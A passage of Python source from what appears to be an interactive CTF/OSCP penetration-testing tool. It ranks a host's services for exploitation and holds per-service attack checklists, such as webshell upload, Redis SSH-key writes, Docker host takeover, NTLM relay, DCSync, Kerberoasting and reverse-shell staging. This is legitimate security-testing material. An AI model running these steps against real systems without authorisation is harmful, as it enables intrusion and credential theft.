        return
    if key == "1":
        _start_port_enum(ip, minutes)
        detail = "fast + full TCP + UDP"
    elif key == "2":
        _start_service_detection(ip, minutes)
        detail = "-sV -sC + OS"
    else:
        _start_vuln_scan(ip, minutes)
        detail = "targeted NSE vuln+auth"
    print(f"\n{GREEN}▶ {name.lower()} running in the background{RESET} "
          f"{DIM}({ip} · {detail}, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")


def _open_host_progress(ip: str) -> None:
    """Interactive progress view for a known host: run a phase by number, or jump to its
    findings with [f]. Reused from the database (p <n>) and the host's other sub-views."""
    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "f":
            _host_findings_view(ip)
            return "refresh"
        if v == "s":
            _status_view()
            return "refresh"
        if v in _PHASES:
            _launch_phase_for(v, ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> run phase · f · s · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/progress",
              "[Enter] refresh · <n> run phase · [f] findings · [s] status · [b] back · [m] menu",
              lambda: _render_host_progress(ip), _handle)


# ── service exploitation (phase 6) ────────────────────────────────────────────
# Services are triaged in CTF/OSCP order: the ones that most often give a fast foothold
# or rich enumeration come first, so you know what to hit first. Each entry is
#   (key, label, {typical ports}, (match tokens for cpe/product/name, all lowercased)).
# A service's class is resolved by the cascade CPE → product/version → service name →
# port default — strongest signal first, port number only as a last resort.
_EXPLOIT_SERVICES = [
    ("http",    "HTTP / web app",     {80, 81, 443, 591, 2082, 2087, 3000, 5000, 5601,
                                       7001, 8000, 8008, 8080, 8081, 8443, 8500, 8888,
                                       9000, 9090, 15672},
     ("http", "https", "ssl/http", "nginx", "apache", "httpd", "iis", "tomcat",
      "jetty", "lighttpd", "werkzeug", "gunicorn", "express", "haproxy", "caddy")),
    ("smb",     "SMB / file shares",  {137, 138, 139, 445},
     ("smb", "microsoft-ds", "netbios-ssn", "netbios", "samba", "cifs")),
    ("winrm",   "WinRM (remote shell)", {5985, 5986}, ("winrm", "wsman")),
    ("ftp",     "FTP",                {21, 990, 2121},
     ("ftp", "vsftpd", "proftpd", "pure-ftpd", "filezilla", "ftpd")),
    ("tftp",    "TFTP (UDP)",         {69}, ("tftp",)),
    ("telnet",  "Telnet",             {23}, ("telnet",)),
    ("nfs",     "NFS / RPC mounts",   {111, 2049},
     ("nfs", "rpcbind", "portmap", "mountd")),
    ("afp",     "AFP (Apple shares)", {548}, ("afp", "netatalk", "apple filing")),
    ("rsync",   "rsync",              {873}, ("rsync",)),
    ("distcc",  "distcc (RCE)",       {3632}, ("distcc",)),
    ("redis",   "Redis",              {6379, 6380}, ("redis",)),
    ("memcached", "Memcached",        {11211}, ("memcache",)),
    ("elastic", "Elasticsearch",      {9200, 9300}, ("elasticsearch", "elastic")),
    ("mongodb", "MongoDB",            {27017, 27018}, ("mongodb", "mongod", "mongo")),
    ("couchdb", "CouchDB",            {5984, 6984}, ("couchdb",)),
    ("neo4j",   "Neo4j",              {7474, 7687}, ("neo4j",)),
    ("influxdb", "InfluxDB",          {8086}, ("influxdb", "influx")),
    ("amqp",    "AMQP / RabbitMQ",    {5672}, ("amqp", "rabbitmq")),
    ("epmd",    "Erlang epmd",        {4369}, ("epmd", "erlang port mapper")),
    ("docker",  "Docker API",         {2375, 2376}, ("docker",)),
    ("jdwp",    "Java JDWP (RCE)",    {8787}, ("jdwp", "java debug")),
    ("rmi",     "Java RMI",           {1050, 1098, 1099}, ("rmi", "jrmi")),
    ("clamav",  "ClamAV (RCE)",       {3310}, ("clamav",)),
    ("ajp",     "AJP / Tomcat (Ghostcat)", {8009}, ("ajp13", "ajp")),
    ("svn",     "SVN (svnserve)",     {3690}, ("svn", "subversion")),
    ("mysql",   "MySQL / MariaDB",    {3306}, ("mysql", "mariadb")),
    ("mssql",   "MS SQL Server",      {1433, 1434}, ("ms-sql", "mssql", "microsoft sql")),
    ("psql",    "PostgreSQL",         {5432}, ("postgresql", "postgres")),
    ("oracle",  "Oracle DB",          {1521, 1748, 1754, 1808, 1809, 2100},
     ("oracle", "tns")),
    ("mqtt",    "MQTT (IoT)",         {1883, 8883}, ("mqtt", "mosquitto")),
    ("ldap",    "LDAP / AD",          {389, 636, 3268, 3269}, ("ldap",)),
    ("kerberos", "Kerberos (AD)",     {88, 464}, ("kerberos", "kpasswd")),
    ("msrpc",   "MSRPC endpoint",     {135, 593}, ("msrpc", "epmap")),
    ("snmp",    "SNMP",               {161, 162}, ("snmp",)),
    ("ipmi",    "IPMI (hash leak)",   {623}, ("ipmi", "asf-rmcp")),
    ("dns",     "DNS",                {53}, ("domain", "dns", "bind")),
    ("smtp",    "SMTP / mail",        {25, 465, 587}, ("smtp",)),
    ("mail2",   "POP3 / IMAP",        {110, 143, 993, 995}, ("pop3", "imap")),
    ("irc",     "IRC",                {6660, 6667, 6669, 6697}, ("irc", "ircd", "unreal")),
    ("rdp",     "RDP",                {3389}, ("ms-wbt-server", "rdp", "terminal serv")),
    ("vnc",     "VNC",                {5900, 5901, 5902, 5903}, ("vnc",)),
    ("ssh",     "SSH",                {22, 2222}, ("ssh", "openssh", "dropbear")),
    ("squid",   "Squid proxy",        {3128}, ("squid",)),
    ("cups",    "CUPS / printing",    {631}, ("cups", "ipp")),
    ("jetdirect", "Printer (JetDirect/PJL)", {9100}, ("jetdirect", "pjl")),
    ("rservices", "BSD r-services",   {512, 513, 514}, ("rlogin", "rexec", "rsh", "rshd")),
    ("x11",     "X11",                {6000, 6001, 6002, 6003, 6004, 6005}, ("x11",)),
    ("finger",  "Finger",             {79}, ("finger",)),
    ("ident",   "ident (user enum)",  {113}, ("ident", "identd")),
    ("rtsp",    "RTSP (cameras)",     {554, 8554}, ("rtsp",)),
    ("sip",     "SIP / VoIP",         {5060, 5061}, ("sip",)),
    ("nntp",    "NNTP",               {119}, ("nntp",)),
]
_EXPLOIT_RANK = {key: i for i, (key, *_rest) in enumerate(_EXPLOIT_SERVICES)}
_EXPLOIT_UNKNOWN = ("other", "other / unknown")   # fallback bucket, always ranked last


# Per-service pentest checklist: the steps to work through once a service is picked in
# phase 6. Starter methodology (HTB/OSCP-flavoured) — each service gets a deeper, curated
# pass later. Keyed by the service class key; 'other' is the generic fallback.
_EXPLOIT_STEPS = {
    "http": [
        # ── fingerprint & recon ──
        ("Response headers, status & redirects", "http-headers"),
        ("Fingerprint the web stack & versions", "http-fingerprint"),
        ("Harvest hostnames from the TLS certificate", "ssl-cert"),
        ("Public exploits for the found versions", "searchsploit"),
        # ── manual inspection ──
        ("Mine page source & JS for leaks", "http-source"),
        ("robots / sitemap / .well-known & error pages", "http-wellknown"),
        ("Inspect cookies & sessions; attack JWTs", "http-cookies"),
        # ── content discovery ──
        ("Discover virtual hosts on this IP", "vhost-fuzz"),
        ("Brute-force directories & files", "dir-brute"),
        ("Hunt exposed VCS / backups / config", "vcs-hunt"),
        ("Discover hidden parameters", "param-hunt"),
        # ── CMS enumeration (run early — a vulnerable plugin can shortcut straight to RCE) ──
        ("CMS scan → plugins, themes, users", "cms-scan"),
        # ── authentication & access control ──
        ("Try default / weak creds on logins", "default-creds"),
        ("Test auth bypass & user enumeration", "auth-bypass"),
        ("Targeted brute-force (gated)", "login-brute"),
        ("IDOR / broken access control", "idor-bac"),
        # ── injection & inclusion (OSCP core) ──
        ("Auto-dump via SQLi (OSCP-safe)", "sqli-dump"),
        ("Full SQLi assessment", "sqli-scan"),
        ("LFI / path traversal", "lfi-scan"),
        ("Remote file inclusion (RFI)", "rfi-scan"),
        ("OS command injection → RCE", "cmdi-scan"),
        ("Server-side template injection → RCE", "ssti-scan"),
        ("XXE & SSRF", "xxe-ssrf"),
        # ── land a shell & foothold ──
        ("File upload → webshell", "upload-shell"),
        ("Admin panel → RCE", "admin-rce"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "next-steps"),
    ],
    "smb": [
        # ── recon (no creds) ──
        ("Null / guest enumeration", "smb-enum"),
        ("Version-RCE scan (detection only)", "smb-vuln"),
        # ── loot shares ──
        ("Loot readable shares for secrets", "smb-loot"),
        ("SYSVOL / NETLOGON GPP loot", "smb-gpp"),
        # ── poison & relay (no creds) ──
        ("Poison LLMNR / NBT-NS → capture NetNTLM", "smb-poison"),
        ("NTLM relay (signing not required)", "smb-relay"),
        ("Coerce auth → relay to escalate", "smb-coerce"),
        # ── DC-critical CVEs ──
        ("DC CVEs: ZeroLogon, noPac, PrintNightmare (detection only)", "smb-dccve"),
        # ── creds → exec / dump ──
        ("Spray creds & hashes (mind lockout)", "smb-spray"),
        ("Valid creds / hash → shell", "smb-exec"),
        ("Dump SAM / LSA / LSASS; DCSync", "smb-dump"),
        ("Writable share → hash capture / payload", "smb-writable"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "smb-next"),
    ],
    "winrm": [
        ("Confirm WinRM transport (5985 HTTP / 5986 HTTPS)", "winrm-enum"),
        ("Validate & spray creds and NTLM hashes against known users (watch lockout)", "winrm-spray"),
        ("Needs 'Remote Management Users' / admin membership — note who has access", "winrm-access"),
        ("Via the shell: enumerate, upload tooling, run commands; reuse creds to pivot", "winrm-recon"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "winrm-next"),
    ],
    "ftp": [
        ("Banner & exact version → searchsploit (vsftpd 2.3.4 backdoor, ProFTPD mod_copy CVE-2015-3306)", "ftp-banner"),
        ("Anonymous login (anonymous:<any>) → browse the tree", "ftp-anon"),
        ("Download everything; test write access (upload a throwaway file)", "ftp-write"),
        ("Try known / default / reused creds; targeted brute only if lockout allows", "ftp-creds"),
        ("If FTP root maps to a web root or is writable → drop a webshell / poison a served file", "ftp-webshell"),
        ("FTP-bounce (PORT) to reach & scan internal hosts through the server", "ftp-bounce"),
        # ── shell spawn moved to the Privilege Escalation phase (one place, all services) ──
        # ── manual steps, tailored to what this host exposed ──
        ("Manual steps & further research", "ftp-next"),
    ],
    "tftp": [
        ("Confirm UDP/69 (no auth) + path-traversal read", "tftp-probe"),
        ("Sweep known filenames (configs/boot/backups) → grep creds & secrets", "tftp-grab"),
        ("Test write access (WRQ throwaway) — non-reversible, no DELETE", "tftp-write"),
        ("Manual steps & further research", "tftp-next"),
    ],
    "nfs": [
        "List exports & allowed clients (showmount -e; nmap nfs-*)",
        "Mount each export; test read and write",
        "no_root_squash → plant a root-owned SUID binary for post-foothold privesc",
        "Match / forge local UID-GID to read restricted files (SSH keys, configs)",
        "NFSv4 hides exports from showmount — mount the root and browse",
        "Manual steps & further research",
    ],
    "afp": [
        "Enumerate shares & server info (afp-showmount / afp-serverinfo)",
        "Try guest / anonymous, then known creds",
        "Mount & hunt Time Machine backups, keychains and configs for creds",
        "Manual steps & further research",
    ],
    "rsync": [
        "List modules (rsync rsync://IP:873/)",
        "Access modules unauth; download everything, test upload to writable modules",
        "Read sensitive files (SSH keys, configs); write to a served/executable path if writable",
        "If auth is required, try known / reused creds",
        "Manual steps & further research",
    ],
    "distcc": [
        "Confirm distccd (3632)",
        "CVE-2004-2687 → arbitrary command execution (distcc_exec or manual DIST protocol)",
        "Use the RCE to read files / stage a reverse shell, then pivot to local privesc",
        "Manual steps & further research",
    ],
    "redis": [
        "Connect unauthenticated; note version, and INFO / CONFIG GET dir,dbfilename",
        "If auth required, try default / no password, then known creds (AUTH)",
        "Read keys for creds/sessions (KEYS *, GET)",
        "Writable dir → write an SSH key (CONFIG SET dir ~/.ssh, dbfilename authorized_keys)",
        "Writable web root → write a webshell via CONFIG SET dir + SAVE",
        "RCE via malicious module (MODULE LOAD) or master/slave replication (redis-rogue-server)",
        "Manual steps & further research",
    ],
    "memcached": [
        "stats / stats items / stats slabs / stats cachedump (unauthenticated)",
        "Dump all keys and values — hunt for sessions, tokens and creds",
        "Manual steps & further research",
    ],
    "elastic": [
        "GET / (version) and /_cat/indices?v — unauthenticated",
        "Dump indices & documents for creds and sensitive data (_search)",
        "Old versions → RCE (CVE-2014-3120, CVE-2015-1427 Groovy sandbox bypass)",
        "If auth is on, try default / known creds against the REST API and Kibana (5601)",
        "Manual steps & further research",
    ],
    "mongodb": [
        "Connect unauthenticated (mongosh); if refused, try default / known creds",
        "show dbs / show collections; dump interesting collections for creds",
        "Note version → searchsploit; check for exposed admin / config data",
        "Manual steps & further research",
    ],
    "couchdb": [
        "GET /_all_dbs and read documents unauthenticated; note version",
        "CVE-2017-12635 → create an admin user (privilege escalation)",
        "CVE-2017-12636 / EMONGO → RCE via query_server config; then reverse shell",
        "Erlang cookie reuse (with epmd) → node RCE",
        "Manual steps & further research",
    ],
    "neo4j": [
        "Browser/API on 7474; try default neo4j:neo4j and known creds",
        "Cypher queries to dump nodes/relationships for creds & data",
        "APOC / version RCE (e.g. CVE-2021-34371, apoc.* file & shell functions)",
        "Manual steps & further research",
    ],
    "influxdb": [
        "CVE-2019-20933 auth bypass (JWT signed with empty shared-secret)",
        "Enumerate databases (SHOW DATABASES) and dump measurements for creds/data",
        "If auth is on, try default / known creds against the HTTP API",
        "Manual steps & further research",
    ],
    "amqp": [
        "Try default guest:guest, then known creds",
        "Reach the management UI (15672) for queues, vhosts, users",
        "Enumerate & drain queues — messages often carry creds / internal data",
        "Erlang cookie (with epmd 4369) → node RCE on RabbitMQ",
        "Manual steps & further research",
    ],
    "epmd": [
        "List Erlang nodes & ports (epmd -names)",
        "Find / guess the Erlang cookie (~/.erlang.cookie, reused across nodes)",
        "Cookie → connect to the node and run erlang:os_cmd → RCE",
        "Common on RabbitMQ / CouchDB clusters — pivot into those",
        "Manual steps & further research",
    ],
    "docker": [
        "Confirm the unauthenticated Docker API (2375/2376)",
        "Enumerate: containers, images, networks (docker -H tcp://IP:2375 ps/images)",
        "Run a privileged container bind-mounting the host / → read/write host filesystem",
        "chroot the mount and add a user / SSH key / cron → root on the host",
        "Loot secrets from images, env vars and volumes",
        "Manual steps & further research",
    ],
    "jdwp": [
        "Confirm the JDWP handshake (Java Debug Wire Protocol)",
        "Any-context RCE via the debugger (jdwp-shellifier / manual breakpoint)",
        "Execute Runtime.exec → reverse shell as the JVM's user",
        "Manual steps & further research",
    ],
    "rmi": [
        "Enumerate the RMI registry — bound objects & remote methods (rmi-dumpregistry, BaRMIe)",
        "Java deserialization RCE against the endpoint (ysoserial gadget chains)",
        "JMX/RMI (if exposed) → MLet MBean → load a malicious MBean for RCE",
        "Manual steps & further research",
    ],
    "ajp": [
        "Confirm AJP13 (8009) and the fronting Tomcat",
        "Ghostcat CVE-2020-1938 → read WEB-INF/web.xml, configs, source",
        "Chain to RCE if you can upload a JSP into a served path (ajpy / metasploit)",
        "Manual steps & further research",
    ],
    "clamav": [
        "Confirm clamd (3310)",
        "Command execution via clamav-exec / known CVE (SCAN a crafted path)",
        "Use the RCE to stage a reverse shell as the clamav user",
        "Manual steps & further research",
    ],
    "svn": [
        "Enumerate over svn:// (svn ls / svn log / svn info)",
        "Checkout the repo; read commit history & diffs for secrets and creds",
        "svn cat / svn up -r<n> old revisions of removed sensitive files",
        "Manual steps & further research",
    ],
    "mysql": [
        ("Banner: handshake → version + auth plugin → searchsploit", "mysql-banner"),
        ("Root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x", "mysql-creds"),
        ("Loot: DBs/users, mysql.user hashes, app creds, LOAD_FILE", "mysql-loot"),
        ("RCE: INTO OUTFILE webshell (FILE priv, exec-verified); UDF guidance", "mysql-rce"),
        ("Manual steps & further research", "mysql-next"),
    ],
    "mssql": [
        ("Banner: SQL Browser (1434) / TDS pre-login → version + instance", "mssql-banner"),
        ("sa blank/default + reused creds (netexec mssql); flags sysadmin", "mssql-creds"),
        ("xp_cmdshell command execution (sysadmin) → foothold", "mssql-exec"),
        ("Loot: DBs, linked servers, sql_login hashes, OPENROWSET file-read", "mssql-loot"),
        ("Manual steps & further research", "mssql-next"),
    ],
    "psql": [
        "Try postgres with blank / default, then known creds",
        "COPY … FROM/TO PROGRAM → OS command execution (9.3+) → reverse shell",
        "Read/write server files (pg_read_file / lo_import/lo_export / COPY)",
        "Enumerate databases & roles; dump app creds; check superuser",
        "Manual steps & further research",
    ],
    "oracle": [
        "Enumerate the SID (oracle-sid-brute / odat sidguesser)",
        "Brute default accounts (scott/tiger, system/manager, dbsnmp/dbsnmp) — odat passwordguesser",
        "With creds → file read/write, privesc and RCE via odat (dbmsscheduler / externaltable)",
        "TNS poisoning / version CVEs on older listeners",
        "Manual steps & further research",
    ],
    "mqtt": [
        "Connect anonymously and subscribe to all topics (# wildcard) — sniff for data/creds",
        "Enumerate topics & retained messages; look for device control / secrets",
        "Publish to control topics to influence devices; note impact",
        "If auth is on, try default / known creds against the broker",
        "Manual steps & further research",
    ],
    "ldap": [
        # ── enumerate ──
        "Anonymous / authenticated bind → dump users, groups, computers, OUs, trusts (ldapsearch / windapsearch)",
        "Read description / info / userPassword fields; extract naming context & password policy",
        "Map attack paths with BloodHound (LDAP collector) — ACLs, sessions, GPOs, delegation",
        # ── roast targets ──
        "Flag AS-REP (DONT_REQ_PREAUTH) and Kerberoast (servicePrincipalName) targets",
        # ── loot secrets from LDAP ──
        "Read LAPS (ms-Mcs-AdmPwd) and gMSA passwords (ReadGMSAPassword) where allowed",
        # ── ACL & object abuse (write rights) ──
        "ACL abuse: GenericAll/Write, WriteDACL/Owner, ForceChangePassword, AddMember (bloodyAD / dacledit)",
        "Shadow credentials: write msDS-KeyCredentialLink → PKINIT auth (pywhisker / certipy)",
        "RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity → S4U impersonation",
        # ── ADCS ──
        "Enumerate CA & templates (certipy find) → ESC1-ESC16 → cert as any user → PKINIT → DA",
        # ── relay / DCSync ──
        "Relay coerced auth to LDAP(S) when signing / channel-binding is off → RBCD / shadow cred",
        "With replication rights (DS-Replication-Get-Changes*) → DCSync all hashes",
        "Manual steps & further research",
    ],
    "kerberos": [
        # ── no creds ──
        "Enumerate valid users via AS-REQ (kerbrute userenum)",
        "AS-REP roast accounts with pre-auth disabled → crack offline",
        "Password-spray discovered users (Kerberos, lockout-aware)",
        # ── with creds ──
        "Kerberoast SPN accounts → crack service passwords offline",
        # ── delegation ──
        "Unconstrained delegation → coerce a DC/host & capture its TGT (printerbug + monitor)",
        "Constrained delegation → S4U2proxy to impersonate users to the allowed SPNs",
        "RBCD → S4U2self + S4U2proxy to mint a service ticket as any user",
        # ── ticket attacks ──
        "Overpass-the-hash (NT hash → TGT); pass-the-ticket to reuse tickets",
        "Silver ticket (service key) / golden ticket (krbtgt) / diamond ticket",
        # ── critical ──
        "noPac (CVE-2021-42278/42287) & MS14-068 → impersonate a DC / domain admin",
        "Manual steps & further research",
    ],
    "msrpc": [
        "Map endpoints via the endpoint mapper (rpcdump) → services & their dynamic ports",
        "SAMR / LSARPC over rpcclient (null or creds): enumdomusers, RID cycle, group members, lsaquery",
        "Coerce auth: MS-RPRN PrinterBug, MS-EFSR PetitPotam, MS-DFSNM DFSCoerce, Coercer → relay / crack",
        "ZeroLogon (MS-NRPC CVE-2020-1472) → reset the DC machine account → DCSync",
        "Remote exec with creds via Task Scheduler (atexec) or Service Control Manager (scmexec / smbexec)",
        "DRSUAPI → DCSync with replication rights; abuse other interfaces (EVEN6, WKSSVC) as found",
        "Manual steps & further research",
    ],
    "snmp": [
        "Brute community strings with a wordlist (onesixtyone: public, private, community)",
        "snmpwalk the full tree — hostname, users, processes, routes, ARP, listening ports, software",
        "Extended MIBs: running processes with arguments (creds!), installed software, local users",
        "Grab configs/creds: Cisco running-config (1.3.6.1.4.1.9.9.96), SNMPv3 USM users",
        "Writable (RW) community → tamper config, or NET-SNMP EXTEND / EXEC MIB → command execution",
        "SNMPv3 → enumerate & brute usernames / auth (snmpv3-brute)",
        "Manual steps & further research",
    ],
    "ipmi": [
        "Dump BMC password hashes — RAKP auth flaw CVE-2013-4786 (ipmi_dumphashes)",
        "Crack the hashes offline (hashcat mode 7300)",
        "Cipher-0 auth bypass → add/modify a BMC admin, then get to the host console",
        "Default vendor creds (ADMIN/ADMIN, root/calvin on iDRAC)",
        "Manual steps & further research",
    ],
    "dns": [
        "Zone transfer (AXFR) against each nameserver → full record dump",
        "Version query (version.bind CHAOS TXT)",
        "Reverse-lookup the subnet & brute-force subdomains → new hosts/vhosts",
        "Note internal names for /etc/hosts and vhost routing; check dynamic-update/cache-poison",
        "Manual steps & further research",
    ],
    "smtp": [
        "Banner & exact version → searchsploit (Exim CVE-2019-10149, Postfix Shellshock)",
        "Username enumeration via VRFY / EXPN / RCPT TO (smtp-user-enum) → valid AD/local users",
        "Open-relay test → spoof/phish internal users from a trusted-looking sender",
        "Authenticate with reused creds; read internal mail for creds & info",
        "Command injection / template / known MTA RCE → shell as the mail service",
        "Client-side: deliver a malicious attachment / link if a user reads mail",
        "Manual steps & further research",
    ],
    "mail2": [
        "Banner & version (POP3/IMAP) → searchsploit",
        "Authenticate with reused / known creds",
        "Read mailboxes for credentials, tokens and internal information",
        "Manual steps & further research",
    ],
    "telnet": [
        ("Banner + version → searchsploit; probe for a no-auth shell / backdoor prompt", "telnet-banner"),
        ("Default / known / reused creds; targeted, lockout-aware", "telnet-creds"),
        ("Sniff cleartext creds off the wire (passive; MITM stays manual)", "telnet-sniff"),
        ("Manual steps & further research", "telnet-next"),
    ],
    "irc": [
        "Connect; enumerate channels, users and the server software/version",
        "UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) → RCE",
        "searchsploit the ircd; try oper default creds",
        "Manual steps & further research",
    ],
    "rdp": [
        "Check NLA & security layer; grab the machine/domain name (rdp-sec-check / nmap)",
        "Known / weak / reused creds & pass-the-hash (careful with lockout)",
        "BlueKeep CVE-2019-0708 (unpatched 7/2008R2) → RCE",
        "Valid creds → interactive session (xfreerdp; /cert:ignore, drive redirect for transfer)",
        "Post-access: dump creds, enable further access",
        "Manual steps & further research",
    ],
    "vnc": [
        "Connect directly — is there any auth at all?",
        "Weak/short password → crack the VNC challenge-response",
        "Recover stored VNC passwords elsewhere (fixed-key DES) and decrypt",
        "Version CVE (e.g. RealVNC auth bypass) → view / control the desktop",
        "Manual steps & further research",
    ],
    "ssh": [
        ("Banner + KEXINIT algos → searchsploit; libssh / Terrapin / user-enum flags", "ssh-banner"),
        "Enumerate valid users (OpenSSH < 7.7 CVE-2018-15473) & list supported auth methods",
        ("Reused / known creds & recovered keys; targeted spray (fail2ban-aware)", "ssh-creds"),
        "Crack an encrypted private key you recover (ssh2john → hashcat)",
        "After access: pivot — local/remote/dynamic port-forward & tunnelling into internal nets",
        "Restricted shell (rbash / lshell) → escape (ssh -t, command tricks) to a full shell",
        "authorized_keys / SSH-agent abuse for lateral movement & persistence",
        "Weak host key algorithms / Terrapin CVE-2023-48795 — note downgrade risk",
        "Manual steps & further research",
    ],
    "squid": [
        "Use it as a proxy to reach internal hosts & ports (proxychains)",
        "Port-scan / access internal-only services through the proxy",
        "cachemgr info-leak (cache_object://) → internal targets & config",
        "Try creds if the proxy requires auth (reused)",
        "Manual steps & further research",
    ],
    "cups": [
        "Admin web UI on 631/admin; note version",
        "Recent CUPS RCE chain (CVE-2024-47176 …) via a crafted printer/IPP",
        "Enumerate printers & captured jobs; read config for creds",
        "Manual steps & further research",
    ],
    "jetdirect": [
        "PJL / PostScript access (PRET) — filesystem, NVRAM, display",
        "Read/write the printer filesystem; retrieve stored jobs & configs",
        "Extract stored credentials (LDAP/SMB pass-back), captured print jobs",
        "Manual steps & further research",
    ],
    "rservices": [
        "rlogin / rsh / rexec via a trusted host or missing auth",
        "~/.rhosts or /etc/hosts.equiv abuse → log in as root without a password",
        "Manual steps & further research",
    ],
    "x11": [
        "Confirm access is unauthenticated (xdpyinfo / x11-access)",
        "Screenshot the session (xwd); read window contents",
        "Keylog and inject keystrokes to run commands as the logged-in user",
        "Manual steps & further research",
    ],
    "finger": [
        "Enumerate users (finger @IP; finger root@IP) — real names, last login, home",
        "Build a validated user list to feed brute-force / spray on other services",
        "Manual steps & further research",
    ],
    "ident": [
        "Query the owner of each open port (ident-user-enum)",
        "Map services to local user accounts — pick brute-force targets",
        "Manual steps & further research",
    ],
    "rtsp": [
        "Enumerate stream URLs (rtsp-url-brute / Cameradar)",
        "Default / weak camera creds; view the stream",
        "searchsploit the camera/DVR firmware for RCE",
        "Manual steps & further research",
    ],
    "sip": [
        "Enumerate extensions & the PBX (svmap / svwar)",
        "Crack / spray extension passwords (svcrack); register a rogue endpoint",
        "Sniff SIP creds; test toll fraud / call interception",
        "Manual steps & further research",
    ],
    "nntp": [
        "Banner & version → searchsploit",
        "List newsgroups and read articles for info",
        "Try auth / posting; check for an auth bypass",
        "Manual steps & further research",
    ],
    "other": [
        "Grab the banner (nc / telnet / openssl s_client) and identify the service",
        "searchsploit the product & version; check exploit-db / GitHub",
        "Look the port & protocol up in HackTricks for a methodology",
        "Try default / anonymous credentials",
        "Run the protocol's nmap scripts (--script '<name>-*') for quick wins",
        "Interact manually to understand the protocol; note it for deeper research",
        "Manual steps & further research",
    ],
}


def _classify_service(port: int, name, product, version, cpe) -> tuple:
    """Resolve one open port to a service class by the cascade CPE → product/version →
    service name → port default. Returns (label, key, signal) where signal names the
    level that matched (cpe / version / service / port) — a proxy for how much to trust
    it (a port-only guess is far weaker than a CPE/version fingerprint)."""
    sources = (
        ("cpe",     (cpe or "").lower()),
        ("version", f"{product or ''} {version or ''}".lower()),
        ("service", (name or "").lower()),
    )
    for signal, text in sources:
        if not text.strip():
            continue
        for key, label, _ports, tokens in _EXPLOIT_SERVICES:
            if any(tok in text for tok in tokens):
                return label, key, signal
    for key, label, ports, _tokens in _EXPLOIT_SERVICES:
        if port in ports:
            return label, key, "port"
    # unrecognised: still show nmap's own service name if it gave one (so the row is
    # useful for research), else a bare 'other'. Stays keyed 'other' → ranked last, no tool.
    if name:
        return name, _EXPLOIT_UNKNOWN[0], "service"
    return _EXPLOIT_UNKNOWN[1], _EXPLOIT_UNKNOWN[0], "port"


def _exploit_targets(ip: str) -> list:
    """The host's services in exploitation-priority order (no output): a list of
    (port, proto, label, key, ver, signal). Shared by the render and the progress view."""
    services = fetch_services(ip)
    triaged = []
    for port, proto, _state in fetch_ports(ip):
        name, product, version, cpe = services.get((port, proto), (None, None, None, None))
        label, key, signal = _classify_service(port, name, product, version, cpe)
        rank = _EXPLOIT_RANK.get(key, len(_EXPLOIT_SERVICES))
        ver = " ".join(x for x in (product, version) if x)
        triaged.append((rank, port, proto, label, key, ver, signal))
    triaged.sort(key=lambda t: (t[0], t[1]))
    return [(port, proto, label, key, ver, signal)
            for _rank, port, proto, label, key, ver, signal in triaged]


def _service_steps_complete(ip: str, port: int, proto: str, key: str) -> bool:
    """True when every checklist step for this service is resolved (done or skip) — the
    condition for turning the service (and, when all are, phase 6) green."""
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    status = fetch_step_status(ip, port, proto, key)
    return bool(steps) and all(status.get(i) in ("done", "skip")
                               for i in range(1, len(steps) + 1))


def _render_exploit_targets(ip: str) -> list:
    """Numbered, priority-ordered list of the host's services worth attacking (best
    CTF/OSCP candidates first). A service whose whole checklist is resolved shows green.
    Returns the ordered targets so a number can pick one."""
    print(f"\n{BOLD}{ip} — service exploitation{RESET}")
    if not fetch_ports(ip):
        print(f"  {DIM}no open ports recorded — run {BOLD}[1] Port enumeration{RESET}"
              f"{DIM} first{RESET}")
        return []
    targets = _exploit_targets(ip)
    rows = []
    for i, (port, proto, label, key, ver, signal) in enumerate(targets, 1):
        # '?' flags a label not confirmed by a -sV version/CPE fingerprint (a service-name
        # or port guess), so it's clear which rows to verify before trusting them.
        name = label + ("?" if signal in ("service", "port") else "")
        disp = f"{GREEN}{name}{RESET}" if _service_steps_complete(ip, port, proto, key) else name
        rows.append([str(i), disp, f"{port}/{proto}", _cell(ver or "—", 30), f"via {signal}"])
    print(_box_table(["#", "SERVICE", "PORT", "VERSION", "SIGNAL"], rows,
                     aligns=["r", "l", "l", "l", "l"]))
    hostnames = fetch_hostnames(ip)
    if hostnames:
        names = ", ".join(hn for hn, _p, _s in hostnames)
        print(f"  {DIM}hostnames (→ /etc/hosts, vhost-fuzz): {RESET}{CYAN}{names}{RESET}")
    return targets


def _step_parts(step) -> tuple:
    """Normalise a checklist entry to (description, tool_key). A plain string has no
    tool; a (description, tool_key) tuple points at a runner in _STEP_TOOLS."""
    if isinstance(step, tuple):
        return step[0], step[1]
    return step, None


def _tool_http_headers(ip: str, port: int, proto: str) -> str:
    """HTTP step-1 tool: grab a web server's response headers (Server, X-Powered-By,
    cookies) + status, WITHOUT following redirects so a 30x Location (often a vhost) is
    captured. Stdlib only — no external dependency; one focused header grab is enough for
    this step (deeper fingerprinting is step 2 / whatweb)."""
    import urllib.request
    import ssl

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):       # keep the 30x so we see Location
            return None

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    url = f"{'https' if tls else 'http'}://{ip}:{port}/"
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(url, headers={"User-Agent": "pshunter"})
    try:
        resp = opener.open(req, timeout=8)
        status, headers = resp.status, resp.headers
    except urllib.error.HTTPError as exc:          # 30x / 4xx / 5xx still carry useful headers
        status, headers = exc.code, exc.headers
    # a connection-level failure (refused / timeout / DNS) propagates → the step won't go green
    lines = [f"{url} → HTTP {status}"]
